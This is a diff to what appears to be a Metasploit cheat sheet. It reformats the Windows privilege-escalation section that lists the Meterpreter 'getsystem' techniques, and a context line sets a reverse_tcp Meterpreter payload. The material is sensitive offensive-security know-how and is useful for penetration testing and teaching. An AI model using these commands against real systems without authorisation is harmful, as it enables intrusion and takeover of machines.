@@ -541,16 +541,16 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 ##### [Get System Information](#Get-System-Information-of-Exploited-Target)
 ### Windows PrivEsc
 ##### [Get System Information](#Get-System-Information-of-Exploited-Target)
-##### Escalate Privileges with GetSystem
+##### Escalate Privileges with GetSystem (Windows)
+| -t | Type |
+|----|------|
+| 0  | All techniques available
+| 1  | Named Pipe Impersonation (In Memory/Admin)
+| 2  | Named Pipe Impersonation (Dropper/Admin)
+| 3  | Token Duplication (In Memory/Admin)
+| 4  | Named Pipe Impersonation (RPCSS variant)
 ```bash
-# Only works with Windows
-getsystem
-
-# 0: All techniques available
-# 1: Named Pipe Impersonation (In Memory/Admin)
-# 2: Named Pipe Impersonation (Dropper/Admin)
-# 3: Token Duplication (In Memory/Admin)
-# 4: Named Pipe Impersonation (RPCSS variant)
+meterpreter > getsystem
 ```
 ##### Windows Gather Privileges Enumeration
 ```bash
